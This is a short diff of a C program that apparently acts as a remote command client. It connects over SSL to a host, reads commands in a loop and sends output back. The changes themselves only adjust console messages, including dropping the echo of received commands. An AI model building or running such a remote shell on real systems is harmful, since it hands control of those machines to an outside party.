@@ -51,14 +51,13 @@ int main(){
 		printf("[-] Error connecting\n");
 		exit(-1);
 	}
-	printf("Connected to %s\n", host);
+	printf("[+] Connected to %s\n", host);
 
 	char cmd[BUFSIZE], tokencmd[BUFSIZE], output[BUFSIZE];
 	FILE *fd;
 	char *error;
 	char *token;
 	while(memset(cmd, 0, BUFSIZE) && SSL_read(ssl, cmd, sizeof(cmd)) > 0){
-		printf("[*] Recv: %s\n", cmd);
 
 		strcpy(tokencmd, cmd);
 
@@ -96,11 +95,11 @@ int main(){
 				printf("%s", output);
 				SSL_write(ssl, output, strlen(output));
 			}
+
+			printf("END\n");
+			printf("===========\n");
 		}
 
-		printf("END\n");
 		SSL_write(ssl, "", 1);
-
-		printf("===========\n");
 	}
 }
